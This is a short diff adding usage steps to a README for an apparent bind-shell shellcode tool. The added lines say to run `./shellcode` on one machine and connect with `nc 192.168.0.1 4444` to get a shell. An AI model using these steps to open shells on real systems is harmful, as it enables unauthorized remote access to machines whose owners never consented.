@@ -23,5 +23,9 @@ Example usage:
 ```
 ./go.sh bind [4444]
 ```
-
 The port number is optional and the default is 4444 if omitted.
+
+Then you need two terminals for the client and server. On the server side you run `./shellcode`
+On the client part you run `nc 192.168.0.1 4444`
+And that's it - now you have shell.
+
